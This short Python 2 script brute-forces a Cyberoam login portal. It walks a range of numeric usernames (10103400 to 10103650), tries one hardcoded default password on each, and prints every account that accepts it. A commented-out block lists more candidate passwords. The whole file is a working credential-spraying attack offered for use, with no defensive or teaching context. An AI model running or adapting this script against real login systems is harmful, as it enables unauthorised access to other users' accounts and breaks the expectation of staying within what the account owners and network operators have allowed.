#!/usr/bin/env python

from cyberoam import sendLoginRequest

password_list = '77uu88'
"""('66ggyy',
	hhgg55
	ddrr55
'ttgg44',
'66ggyy',
'77uu88')"""

uname_llimit = '10103400'
uname_ulimit = '10103650'

def brute_force():
	default_passwd = password_list
	i = int(uname_llimit)
	j = int(uname_ulimit)
	print 'Searching...'
	while i <= int(uname_ulimit):
		response = sendLoginRequest(str(i), default_passwd)
		if response == True:
			print 'There is the hit: %s' % i
		i = i + 1

brute_force()